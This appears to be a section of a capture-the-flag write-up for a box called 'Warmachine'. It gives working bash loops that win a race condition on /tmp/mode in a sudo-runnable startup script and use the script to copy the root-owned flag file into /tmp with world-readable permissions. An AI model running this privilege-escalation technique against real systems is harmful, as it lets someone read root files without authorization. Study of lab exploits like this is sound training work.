## Warmachine

By running sudo -l we can see there is a startup file we can run as sudo.

We need to exploit a race condition that will let us go into maintenance mode by writing `MAINTENANCE` into the `/tmp/mode` file after the script writes `COMBAT` in it at the beginning of its execution but before it gets read. The difference from mechcore is that when we lose the race the script will invoke `killenemies` and kill our ssh connection. Sadly we do have to run the script once so that the `/tmp/mode` is created with the correct ownership and permissions.

Let's overwrite it:

```bash
nohup bash -c "while true; do echo MAINTENANCE > /tmp/mode; done" > /dev/null &
echo 'while true; do if [ -s /tmp/flag.txt ]; then exit; fi; echo "cat /root/flag.txt > /tmp/flag.txt; chmod 666 /tmp/flag.txt" | sudo /usr/bin/python3 /home/warmachine/startup.py; done' > /tmp/privesc.sh
chmod +x /tmp/privesc.sh
nohup /tmp/privesc.sh > /dev/null &
```

it will try to leverage the race condition to copy the flag to the `/tmp` folder.
Then we can just run this command:

```bash
cat /tmp/flag.txt
```